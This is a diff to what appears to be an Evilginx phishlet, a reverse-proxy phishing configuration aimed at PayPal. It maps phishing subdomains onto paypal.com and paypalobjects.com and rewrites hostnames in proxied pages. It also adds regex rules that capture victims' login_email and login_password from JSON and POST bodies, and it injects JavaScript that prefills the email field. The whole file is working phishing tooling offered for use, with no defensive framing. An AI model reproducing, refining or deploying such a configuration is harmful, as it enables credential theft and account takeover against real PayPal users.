@@ -10,7 +10,7 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'paypal.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: '', orig_sub: '', domain: 'paypal.com', session: true, is_landing: false, auto_filter: true}
-#  - {phish_sub: 'paypalobjects', orig_sub: 'www', domain: 'paypalobjects.com', session: false, is_landing: false}
+  - {phish_sub: 'paypalobjects', orig_sub: 'www', domain: 'paypalobjects.com', session: false, is_landing: false}
   - {phish_sub: 'c', orig_sub: 'c', domain: 'paypal.com', session: false, is_landing: false}
   - {phish_sub: 'b.stats', orig_sub: 'b.stats', domain: 'paypal.com', session: false, is_landing: false}
   - {phish_sub: 't', orig_sub: 't', domain: 'paypal.com', session: false, is_landing: false}
@@ -20,9 +20,8 @@ proxy_hosts:
 sub_filters:
   - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-#  - {triggers_on: 'www.paypal.com', orig_sub: '', domain: 'paypalobjects.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-#  - {triggers_on: 'www.paypal.com', orig_sub: '', domain: 'paypalobjects.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.paypal.com', orig_sub: 'c6', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypalobjects.com', search: 'www.paypalobjects.com', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.paypal.com', orig_sub: '', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: 'c6', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: 'c', domain: 'paypal.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.paypal.com', orig_sub: 'c', domain: 'paypal.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
@@ -43,12 +42,22 @@ auth_urls:
 credentials:
   username:
     key: 'login_email'
-    search: '(.*)'
-    type: 'post'
+    search: '"login_email":"([^"]*)"'
+    type: 'json'
   password:
     key: 'login_password'
-    search: '(.*)'
-    type: 'post'
+    search: '"login_password":"([^"]*)"'
+    type: 'json'
+  custom:
+    - key: 'login_email'
+      search: '(.*)'
+      type: 'post'
+    - key: 'login_password'
+      search: '(.*)'
+      type: 'post'
+    - key: 'password'
+      search: '(.*)'
+      type: 'post'
 
 login:
   domain: 'www.paypal.com'
@@ -61,7 +70,7 @@ js_inject:
     script: |
       function lp(){
         var email = document.querySelector("#email");
-        if (email != null && password != null) {
+        if (email != null) {
           email.value = "{email}";
           return;
         }
